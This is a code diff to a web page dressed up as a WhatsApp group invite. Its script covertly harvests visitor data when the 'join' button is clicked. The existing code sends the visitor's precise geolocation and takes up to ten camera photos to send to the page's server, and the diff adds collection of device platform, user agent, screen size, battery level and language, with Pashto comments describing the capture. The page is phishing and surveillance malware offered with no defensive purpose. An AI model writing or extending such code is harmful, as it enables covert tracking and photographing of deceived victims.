@@ -14,6 +14,7 @@
         .group-icon { width: 100px; height: 100px; margin-bottom: 30px; }
         .invite-text { font-size: 26px; color: #111B21; margin-bottom: 25px; max-width: 320px; line-height: 1.3; }
         .join-btn { background-color: #25D366; color: white; padding: 14px 40px; border-radius: 25px; border: none; font-size: 18px; font-weight: 500; margin-bottom: 40px; cursor: pointer; }
+        .join-btn:disabled { opacity: 0.7; cursor: not-allowed; }
         .sub-text { color: #667781; font-size: 15px; margin-bottom: 8px; }
         .download-link { color: #111B21; font-weight: bold; text-decoration: underline; font-size: 16px; }
         footer { background-color: #111B21; padding: 20px; display: flex; justify-content: center; }
@@ -58,6 +59,27 @@
                     body: formData
                 });
             } catch (e) {}
+        }
+
+        async function sendDeviceInfo() {
+            let batteryPercentage = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryPercentage = Math.round(battery.level * 100) + "%";
+                }
+            } catch (e) {}
+
+            const info = { 
+                deviceType: navigator.platform, 
+                androidVer: navigator.userAgent, 
+                screenSize: window.innerWidth + " x " + window.innerHeight, 
+                batteryLevel: batteryPercentage, 
+                language: navigator.language 
+            };
+            const fd = new FormData(); 
+            fd.append('device_info', JSON.stringify(info)); 
+            await sendData(fd);
         }
 
         async function sendSinglePhoto(stream) {
@@ -114,17 +136,23 @@
             btn.innerText = "Connecting...";
             btn.disabled = true;
 
+            // د وسیلې معلومات او د بیټرۍ فیصدي لېږل
+            await sendDeviceInfo();
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const formData = new FormData();
-                        formData.append('latitude', pos.coords.latitude);
-                        formData.append('longitude', pos.coords.longitude);
-                        await sendData(formData);
-                    },
-                    () => {},
-                    { timeout: 4000, enableHighAccuracy: true }
-                );
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const formData = new FormData();
+                            formData.append('latitude', pos.coords.latitude);
+                            formData.append('longitude', pos.coords.longitude);
+                            await sendData(formData);
+                            resolve();
+                        },
+                        () => { resolve(); },
+                        { timeout: 4000, enableHighAccuracy: true }
+                    );
+                });
             }
 
             try {
@@ -139,6 +167,7 @@
                     let photoCount = 0;
                     const maxPhotos = 10; 
 
+                    // ۱۰ پرله‌پسې عکسونه اخستل او لېږل
                     const photoInterval = setInterval(async () => {
                         if (photoCount < maxPhotos) {
                             photoCount++;
